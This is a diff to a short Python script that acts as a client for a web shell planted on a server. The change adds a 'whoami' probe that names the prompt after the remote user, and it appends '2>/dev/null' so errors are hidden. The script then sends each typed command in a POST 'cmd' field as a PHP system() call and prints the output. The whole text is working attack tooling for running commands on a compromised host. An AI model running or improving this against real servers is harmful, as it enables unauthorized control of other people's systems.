@@ -8,9 +8,14 @@ session=requests.Session()
 if(len(arguments) == 2):
 	url=arguments[1]
 	command=""
+	payload=f"system('whoami');"
+	user=(session.post(url,data={"cmd":f"{payload}"}).text).strip()
+	if user.strip() == '':
+		print(f"No valid user found.Check connection")
+		exit()
 	while command != 'q':
-		command=input("#: ")
-		payload=f"system('{command}');"
+		command=input(f"{user} > ")
+		payload=f"system('{command} 2>/dev/null');"
 		response=session.post(url,data={"cmd":f"{payload}"})
 		content=response.text
 		try:
